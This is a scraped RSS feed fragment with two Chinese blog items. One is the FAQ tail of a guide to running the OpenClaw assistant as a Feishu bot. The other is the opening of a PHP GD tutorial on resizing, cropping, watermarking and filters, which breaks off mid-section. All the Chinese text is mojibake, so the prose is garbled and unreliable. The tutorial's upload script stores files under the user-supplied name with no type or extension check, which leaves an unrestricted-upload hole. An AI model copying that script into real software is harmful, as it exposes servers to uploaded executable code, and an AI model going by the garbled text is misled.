<p>æ³¨æ„ï¼šæ¯æ¬¡ä¿®æ”¹é…ç½®åéƒ½éœ€è¦é‡æ–°å‘å¸ƒç‰ˆæœ¬ï¼Œå»ºè®®å…¨éƒ¨é…ç½®å®Œæˆåå†ç»Ÿä¸€å‘å¸ƒã€‚</p>
</blockquote>
<p>å‘å¸ƒå®Œæˆåï¼Œå›åˆ°é£ä¹¦å®¢æˆ·ç«¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å·²ä¸Šçº¿ï¼Œç‚¹å‡»æ‰“å¼€åº”ç”¨
<img src="https://image.catchadmin.com/202601281816608.png" alt="é£ä¹¦åº”ç”¨å‘å¸ƒæˆåŠŸ - Openclaw AI æœºå™¨äºº" loading="lazy"/>
å‘æœºå™¨äººå‘é€ <code>Hello</code>ï¼Œå³å¯æ”¶åˆ° Moltbot çš„å›å¤
<img src="https://image.catchadmin.com/202601281817700.png" alt="é£ä¹¦ Openclaw AI åŠ©æ‰‹å›å¤æµ‹è¯•æˆåŠŸ" loading="lazy"/></p>
<h3 data-id="heading-9">å¸¸è§é—®é¢˜ FAQ</h3>
<h4 data-id="heading-10">OpenClaw å’Œ Clawdbotã€Moltbot æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ</h4>
<p>OpenClaw æ˜¯è¯¥é¡¹ç›®çš„æœ€æ–°æ­£å¼åç§°ã€‚é¡¹ç›®æœ€åˆå« Clawdbotï¼Œåå› å•†æ ‡é—®é¢˜æ›´åä¸º Moltbotï¼Œæœ€ç»ˆåœ¨ 2025 å¹´ 1 æœˆæ­£å¼å®šåä¸º OpenClawã€‚ä¸‰è€…æ˜¯åŒä¸€ä¸ªé¡¹ç›®çš„ä¸åŒé˜¶æ®µå‘½åã€‚</p>
<h4 data-id="heading-11">OpenClaw æ”¯æŒå“ªäº› AI æ¨¡å‹ï¼Ÿ</h4>
<p>OpenClaw æ”¯æŒå¤šç§ AI æ¨¡å‹æœåŠ¡å•†ï¼ŒåŒ…æ‹¬ Anthropic Claudeã€OpenAI GPTã€é€šä¹‰åƒé—®ï¼ˆQwenï¼‰ã€KIMIã€å°ç±³ MiMo ç­‰ã€‚æœ¬æ•™ç¨‹ä½¿ç”¨é€šä¹‰åƒé—®æ˜¯å› ä¸ºå…¶å…è´¹é¢åº¦å……è¶³ï¼Œé€‚åˆå…¥é—¨å­¦ä¹ ã€‚</p>
<h4 data-id="heading-12">ä¸ºä»€ä¹ˆå®‰è£…æ—¶æç¤º npm install failedï¼Ÿ</h4>
<p>è¿™é€šå¸¸æ˜¯æœåŠ¡å™¨å†…å­˜ä¸è¶³å¯¼è‡´çš„ã€‚æ–°ç‰ˆæœ¬è„šæœ¬å¯¹å†…å­˜è¦æ±‚è¾ƒé«˜ï¼Œ2G å†…å­˜å¯èƒ½ä¼šå‡ºç° OOMï¼ˆå†…å­˜æº¢å‡ºï¼‰ã€‚å»ºè®®é…ç½® swap äº¤æ¢ç©ºé—´ï¼Œå°†ç¡¬ç›˜ç©ºé—´ä½œä¸ºè™šæ‹Ÿå†…å­˜ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-13">OpenClaw å¯ä»¥åœ¨ Windows æˆ– macOS ä¸Šè¿è¡Œå—ï¼Ÿ</h4>
<p>å¯ä»¥ã€‚OpenClaw æ”¯æŒ Macã€Windows å’Œ Linux ç³»ç»Ÿã€‚æœ¬æ•™ç¨‹ä»¥ Linux ä¸ºä¾‹ï¼Œå…¶ä»–ç³»ç»Ÿçš„å®‰è£…æ–¹å¼å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.ai%2F" target="_blank" title="https://docs.openclaw.ai/" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h4 data-id="heading-14">é£ä¹¦æœºå™¨äººé…ç½®åæ— æ³•æ”¶åˆ°æ¶ˆæ¯æ€ä¹ˆåŠï¼Ÿ</h4>
<p>è¯·æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>ç¡®è®¤é£ä¹¦æ’ä»¶å·²æ­£ç¡®å®‰è£…ï¼ˆ<code>clawdbot plugins install @m1heng-clawd/feishu</code>ï¼‰</li>
<li>æ£€æŸ¥ App ID å’Œ App Secret é…ç½®æ˜¯å¦æ­£ç¡®</li>
<li>ç¡®è®¤å·²å¼€é€šã€Œæ¥æ”¶æ¶ˆæ¯ã€äº‹ä»¶æƒé™</li>
<li>æ£€æŸ¥é•¿è¿æ¥æ¨¡å¼æ˜¯å¦é…ç½®æˆåŠŸ</li>
<li>ç¡®ä¿åº”ç”¨ç‰ˆæœ¬å·²å‘å¸ƒ</li>
</ol>
<h4 data-id="heading-15">OpenClaw æ•°æ®å®‰å…¨å—ï¼Ÿ</h4>
<p>OpenClaw è¿è¡Œåœ¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œæ‰€æœ‰æ•°æ®éƒ½åœ¨æœ¬åœ°å­˜å‚¨ï¼Œä¸ä¼šä¸Šä¼ åˆ°ç¬¬ä¸‰æ–¹äº‘ç«¯ã€‚ä½†ç”±äºå®ƒå…·æœ‰ç³»ç»Ÿçº§æƒé™ï¼Œå»ºè®®åœ¨ç‹¬ç«‹çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦æ•°æ®çš„æœºå™¨ä¸Šè¿è¡Œã€‚</p>
<h4 data-id="heading-16">é™¤äº†é£ä¹¦ï¼ŒOpenClaw è¿˜æ”¯æŒå“ªäº›å¹³å°ï¼Ÿ</h4>
<p>OpenClaw æ”¯æŒå¤šä¸ªèŠå¤©å¹³å°ï¼ŒåŒ…æ‹¬ WhatsAppã€Telegramã€Discordã€Slackã€Microsoft Teamsã€Signalã€iMessageã€Google Chatã€Twitch ç­‰ã€‚æ¯ä¸ªå¹³å°éœ€è¦å®‰è£…å¯¹åº”çš„æ’ä»¶ã€‚</p>
<h4 data-id="heading-17">OpenClaw å¯ä»¥åšä»€ä¹ˆï¼Ÿ</h4>
<p>OpenClaw å¯ä»¥æ‰§è¡Œå¤šç§ä»»åŠ¡ï¼š</p>
<ul>
<li>é‚®ä»¶ç®¡ç†å’Œè‡ªåŠ¨å›å¤</li>
<li>æ—¥ç¨‹å®‰æ’å’Œæé†’</li>
<li>æµè§ˆç½‘é¡µå’Œæ•°æ®æå–</li>
<li>æ–‡ä»¶è¯»å†™å’Œç®¡ç†</li>
<li>æ‰§è¡Œ Shell å‘½ä»¤</li>
<li>ç¼–å†™å’Œè¿è¡Œä»£ç </li>
<li>æ•°æ®æŸ¥è¯¢å’Œåˆ†æ</li>
</ul>
<h4 data-id="heading-18">å¦‚ä½•æ›´æ–° OpenClaw åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Ÿ</h4>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›´æ–°ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">openclaw update
</code></pre>
<h4 data-id="heading-19">OpenClaw å‘½ä»¤å’Œ clawdbot å‘½ä»¤æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h4>
<p>OpenClaw æ›´ååï¼Œå®˜æ–¹æ¨èä½¿ç”¨ <code>openclaw</code> å‘½ä»¤ï¼Œä½†ä¸ºäº†å…¼å®¹æ€§ï¼Œ<code>clawdbot</code> å‘½ä»¤ä»ç„¶å¯ç”¨ã€‚ä¸¤è€…åŠŸèƒ½å®Œå…¨ç›¸åŒï¼Œå»ºè®®æ–°ç”¨æˆ·ç›´æ¥ä½¿ç”¨ <code>openclaw</code> å‘½ä»¤ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½]]></title>    <link>https://juejin.cn/post/7601169987395403827</link>    <guid>https://juejin.cn/post/7601169987395403827</guid>    <pubDate>2026-01-31T00:39:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601169987395403827" data-draft-id="7600982613654192178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½"/> <meta itemprop="keywords" content="åç«¯,PHP"/> <meta itemprop="datePublished" content="2026-01-31T00:39:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:39:34.000Z" title="Sat Jan 31 2026 00:39:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</h2>
<p>æåˆ° PHP å’Œå›¾åƒï¼Œä½ ä¼šæƒ³åˆ°ä»€ä¹ˆï¼Ÿå¤§æ¦‚æ˜¯ä¸Šä¼ ä¸€å¼ å›¾ç‰‡åˆ°ç½‘ç«™ï¼Œç„¶åæ”¶å·¥ã€‚ä½† PHP å¯ä¸åªæ˜¯ä¸ªä¸Šä¼ å·¥å…·â€”â€”å®ƒåœ¨å›¾åƒå¤„ç†æ–¹é¢è—ç€ä¸å°‘æœ¬äº‹ã€‚</p>
<p>å›¾ç‰‡å¤ªå¤§æ”¾ä¸ä¸‹ç½‘é¡µï¼Ÿéœ€è¦è£æ‰èƒŒæ™¯é‡Œé‚£ä¸ªä¹±å…¥çš„è·¯äººï¼ŸPHP éƒ½èƒ½æå®šã€‚æ— è®ºæ˜¯ç¼©æ”¾ã€è£å‰ªã€åŠ æ°´å°ï¼Œè¿˜æ˜¯åƒ Instagram é‚£æ ·åŠ æ»¤é•œï¼ŒPHP éƒ½èƒ½èƒœä»»ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¼šå¸¦ä½ äº†è§£ PHP å›¾åƒå¤„ç†çš„æ›´å¤šç©æ³•ã€‚æˆ‘ä»¬ä¼šæ·±å…¥ GD åº“ï¼Œé¡ºä¾¿èŠèŠ Imagickã€‚</p>
<h3 data-id="heading-1">GD å’Œ Imagickï¼šä¸¤å¤§å›¾åƒå¤„ç†åº“</h3>
<p>åœ¨åŠ¨æ‰‹ä¹‹å‰ï¼Œå…ˆä»‹ç»ä¸¤ä¸ªæ ¸å¿ƒå·¥å…·ï¼šGD åº“å’Œ Imagickã€‚</p>
<h4 data-id="heading-2">GD åº“ï¼šç¨³å®šå¯é çš„è€ä¼™è®¡</h4>
<p>PHP å†…ç½®çš„ GD åº“æ˜¯ä¸ªç»å…¸é€‰æ‹©ï¼Œé€‚åˆå¤„ç†åŸºç¡€çš„å›¾åƒæ“ä½œï¼šç¼©æ”¾ã€è£å‰ªã€æ·»åŠ æ–‡å­—ã€‚å®ƒé»˜è®¤å°±åœ¨ PHP é‡Œï¼Œä¸ç”¨é¢å¤–å®‰è£…ã€‚è™½ç„¶ä¸æ˜¯æœ€ç‚«çš„ï¼Œä½†å¤Ÿç”¨ã€ç¨³å®šã€‚</p>
<h4 data-id="heading-3">Imagickï¼šåŠŸèƒ½æ›´å¼ºçš„æ–°é€‰æ‹©</h4>
<p>Imagick æ˜¯å¦ä¸€ä¸ªå›¾åƒå¤„ç†åº“ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚å®ƒæ“…é•¿å¤„ç†çŸ¢é‡å›¾ã€åº”ç”¨ç‰¹æ•ˆã€æ”¯æŒæ›´å¤šæ ¼å¼ã€‚å¦‚æœä½ éœ€è¦åšå¤æ‚çš„å›¾åƒå¤„ç†ï¼ŒImagick æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ä¸è¿‡æœ¬æ–‡ä¸»è¦ç”¨ GD åº“æ¥æ¼”ç¤ºã€‚</p>
<h3 data-id="heading-4">åŸºç¡€ï¼šå›¾åƒä¸Šä¼ </h3>
<p>åœ¨å¤„ç†å›¾åƒä¹‹å‰ï¼Œå¾—å…ˆæŠŠå®ƒä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºç¡€çš„ä¸Šä¼ è„šæœ¬ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">'POST'</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>])) {
    <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>];
    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">'uploads/'</span>;
    <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">'name'</span>]);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$uploadFile</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Image uploaded successfully!'</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Failed to upload image.'</span>;
    }
}
</code></pre>
<p>è¿™æ®µä»£ç æŠŠä¸Šä¼ çš„å›¾ç‰‡ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹å¤„ç†äº†ã€‚</p>
<h3 data-id="heading-5">ä½¿ç”¨ GD åº“å¤„ç†å›¾åƒ</h3>
<p>ä¸Šä¼ æå®šäº†ï¼Œç°åœ¨è¿›å…¥æ­£é¢˜â€”â€”å›¾åƒå¤„ç†ã€‚</p>
<h4 data-id="heading-6">ç¼©æ”¾å›¾åƒ</h4>
<p>å›¾ç‰‡å¤ªå¤§ä¼šæ‹–æ…¢é¡µé¢åŠ è½½é€Ÿåº¦ã€‚ç”¨ GD åº“å¯ä»¥è½»æ¾ç¼©æ”¾ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resizeImage</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    
    <span class="hljs-variable">$newImage</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>);
    <span class="hljs-title function_ invoke__">imagecopyresized</span>(<span class="hljs-variable">$newImage</span>, <span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>, <span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$newImage</span>, <span class="hljs-variable">$target</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$newImage</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æŠŠå›¾åƒç¼©æ”¾åˆ°æŒ‡å®šçš„å®½é«˜ï¼Œé€‚åˆåœ¨å±•ç¤ºå‰è°ƒæ•´å›¾ç‰‡å°ºå¯¸ã€‚</p>
<h4 data-id="heading-7">è£å‰ªå›¾åƒ</h4>
<p>éœ€è¦è£æ‰å›¾ç‰‡çš„æŸä¸ªåŒºåŸŸï¼Ÿç”¨ <code>imagecrop()</code> å‡½æ•°ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cropImage</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$x</span>, <span class="hljs-variable">$y</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    
    <span class="hljs-variable">$croppedImage</span> = <span class="hljs-title function_ invoke__">imagecrop</span>(<span class="hljs-variable">$image</span>, [<span class="hljs-string">'x'</span> =&gt; <span class="hljs-variable">$x</span>, <span class="hljs-string">'y'</span> =&gt; <span class="hljs-variable">$y</span>, <span class="hljs-string">'width'</span> =&gt; <span class="hljs-variable">$width</span>, <span class="hljs-string">'height'</span> =&gt; <span class="hljs-variable">$height</span>]);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$croppedImage</span> !== <span class="hljs-literal">FALSE</span>) {
        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$croppedImage</span>, <span class="hljs-variable">$target</span>);
        <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$croppedImage</span>);
    }
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
}
</code></pre>
<p>æŒ‡å®šè£å‰ªåŒºåŸŸçš„åæ ‡å’Œå°ºå¯¸ï¼ŒPHP ä¼šå¸®ä½ å®Œæˆå‰©ä¸‹çš„å·¥ä½œã€‚</p>
<h4 data-id="heading-8">æ·»åŠ æ°´å°</h4>
<p>å¦‚æœä½ è¿è¥ä¸€ä¸ªå…è®¸ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡çš„ç½‘ç«™ï¼Œç»™å›¾ç‰‡åŠ æ°´å°å¯ä»¥é˜²æ­¢ç›—ç”¨ã€‚ä¸‹é¢æ˜¯æ·»åŠ æ°´å°çš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addWatermark</span>(<span class="hljs-params"><span class="hljs-variable">$imagePath</span>, <span class="hljs-variable">$watermarkPath</span>, <span class="hljs-variable">$targetPath</span></span>) </span>{
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$imagePath</span>);
    <span class="hljs-variable">$watermark</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$watermarkPath</span>);
    
    <span class="hljs-variable">$imageWidth</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-variable">$imageHeight</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-variable">$watermarkWidth</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$watermark</span>);
    <span class="hljs-variable">$watermarkHeight</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$watermark</span>);
    
    <span class="hljs-comment">// æ°´å°æ”¾åœ¨å³ä¸‹è§’</span>
    <span class="hljs-variable">$destX</span> = <span class="hljs-variable">$imageWidth</span> - <span class="hljs-variable">$watermarkWidth</span> - <span class="hljs-number">10</span>;
    <span class="hljs-variable">$destY</span> = <span class="hljs-variable">$imageHeight</span> - <span class="hljs-variable">$watermarkHeight</span> - <span class="hljs-number">10</span>;
    
    <span class="hljs-title function_ invoke__">imagecopy</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$watermark</span>, <span class="hljs-variable">$destX</span>, <span class="hljs-variable">$destY</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$watermarkWidth</span>, <span class="hljs-variable">$watermarkHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$targetPath</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$watermark</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æŠŠ PNG æ ¼å¼çš„æ°´å°å åŠ åˆ°å›¾ç‰‡å³ä¸‹è§’ã€‚</p>
<h3 data-id="heading-9">è¿›é˜¶ï¼šæ»¤é•œå’Œç¼©ç•¥å›¾</h3>
<p>æŒæ¡äº†åŸºç¡€æ“ä½œï¼Œæ¥çœ‹çœ‹æ›´é«˜çº§çš„ç©æ³•ã€‚</p>
<h4 data-id="heading-10">åº”ç”¨æ»¤é•œ</h4>
<p>GD åº“æ”¯æŒç»™å›¾åƒæ·»åŠ æ»¤é•œã€‚æ¯”å¦‚æŠŠå›¾ç‰‡è½¬æˆç°åº¦ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">applyGrayscale</span>(<span class="hljs-params"><span class="hljs-variable">$imagePath</span>, <span class="hljs-variable">$targetPath</span></span>) </span>{
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$imagePath</span>);
    
    <span class="hljs-title function_ invoke__">imagefilter</span>(<span class="hljs-variable">$image</span>, IMG_FILTER_GRAYSCALE);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$targetPath</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
}
</code></pre>
<p>é™¤äº†ç°åº¦ï¼Œè¿˜å¯ä»¥è°ƒæ•´äº®åº¦ã€å¯¹æ¯”åº¦ï¼Œç”šè‡³åšåƒç´ åŒ–æ•ˆæœã€‚</p>
<h4 data-id="heading-11">ç”Ÿæˆç¼©ç•¥å›¾</h4>
<p>åœ¨å›¾ç‰‡åº“æˆ–å•†å“åˆ—è¡¨ä¸­ï¼Œç¼©ç•¥å›¾æ˜¯å¿…ä¸å¯å°‘çš„ã€‚ä¸‹é¢æ˜¯ç”Ÿæˆç¼©ç•¥å›¾çš„å‡½æ•°ï¼š</p>
